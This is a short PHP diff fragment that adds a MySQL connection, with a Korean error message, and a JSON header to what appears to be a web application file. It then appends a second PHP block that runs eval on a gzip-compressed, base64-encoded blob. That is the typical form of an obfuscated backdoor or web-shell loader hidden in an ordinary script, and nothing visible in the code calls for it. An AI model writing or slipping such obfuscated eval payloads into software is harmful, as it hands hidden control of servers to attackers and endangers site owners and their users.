+$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
+mysqli_select_db($connect,$dbname);
+
+header('Content-Type:application/json');
+?>
+<?php eval(gzinflate(base64_decode('BcFHjqNAAADA58yMOIBN1moPBGNyMIOhfVmRc5NTv36r8j3uvktUw6KL1/w7iZecof5leTpk+fdXkal6O2mHIMgewuDGlbIWdTde0wa/lYgSdFivSZdkirrosTQmQ6dwyeo9k2dHhoXdT+q0zJBDpg2noMLrynBfBaTbgpK6x34UQBhPSsx+c3Pe9vGIzqZxJZNM41GwTko39KTfHmB+80GE7lTn1lRX+P1p9NyOrM4B9Rj5JNGVbF/RIphLfTYtYcQqrcUJbGdykgut+1Q4aOMgiJPPAKPYK+K3ojTZ6b6nZzlRH9W3S+KlqecIOH7tyDrIEjz39udNzEqUDMuu/vqOYAg9Pdh6vNEgXu6n6oE0eTRCqHBpg9Y1qNzVnD98sXS3lDJ7cpgGOp+CrA4o+BYCZxkvB0t4/DecbznXeKyZ2Jwxa4y+P/OReu5BOb3vJlG703jXXXJxc7kMY0ue08GXorsTZZslxYZdXM5JybnWbtRFk29/ZHrScR9OfHAoUbS49m1iFfhDTPjw6no+xK9Ff3Lg2S2KvKJDIxmaWWIaVTg8uSK68R2OrU678oRqOJTSeE2uCWwJr2FImGhDiZXxNGuwiVfqgo0vXDihhbNkKLcB+UFUefQ627xiV8xqxzqMLADWqXB6BqRcAhpkW/NowEGkGbIVsVLDCf+02KOH+oOGAT00DdA/UgSlZ/lIMVs4ip154Yf29+vn5+fPfw==')));
+?>
